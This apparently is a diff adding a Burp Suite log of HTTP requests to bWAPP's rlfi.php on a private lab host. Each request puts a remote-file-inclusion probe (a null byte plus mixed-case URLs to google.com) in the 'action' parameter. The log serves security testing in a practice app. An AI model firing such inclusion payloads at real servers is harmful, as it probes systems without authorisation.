+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTp%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTp%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTp%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTp%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTp%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTpS%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTpS%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTpS%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTpS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HtTpS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
